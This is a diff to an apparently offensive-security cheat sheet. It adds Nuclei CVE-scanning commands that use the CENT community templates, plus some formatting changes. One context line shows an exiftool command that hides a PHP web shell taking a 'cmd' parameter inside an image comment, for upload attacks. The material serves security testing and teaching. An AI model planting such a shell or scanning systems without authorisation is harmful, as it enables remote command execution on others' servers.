@@ -9,10 +9,11 @@
 [Censys](https://search.censys.io/) - best overall scanner but without vulnerability discovery
 
 [PrettyRecon](https://prettyrecon.com/) - Active Reconnaissance Tool\
-[Nuclei](https://github.com/projectdiscovery/nuclei#readme) - Security check scanner\
+[Nuclei](https://github.com/projectdiscovery/nuclei#readme) - Security check scanner that is based on templates; Get started with Nuclei [here](https://nuclei.projectdiscovery.io/nuclei/get-started/#running-nuclei)\
 [Nuclei Templates Directory](https://nuclei-templates.netlify.app/) - Visually navigate available nuclei templates\
 [Community edition nuclei templates (CENT)](https://github.com/xm1k3/cent) - collect and organize other custom templates
 
+\
 Getting started with some CVE scanning using Nuclei templates:
 
 ```
@@ -31,6 +32,16 @@ cat site subdomains.txt | nuclei -t /path/to/nuclei-templates/
 
 ```
 nuclei -t /path/to/nuclei-templates/ -l urls.txt
+```
+
+Combining nuclei scanner with CENT custom templates
+
+```
+nuclei -u https://example.com -t ./cent-nuclei-templates -tags cve
+```
+
+```
+nuclei -l urls.txt -t ./cent-nuclei-templates -tags cve
 ```
 
 \
@@ -307,7 +318,9 @@ Registration
       exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
       ```
 
-**Adobe Experience Manager (AEM) Configuration Testing**
+
+
+#### **Adobe Experience Manager (AEM) Configuration Testing**
 
 Shodan Dork:
 
@@ -578,3 +591,4 @@ grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0
 /.svn/entries
 {% endtab %}
 {% endtabs %}
+
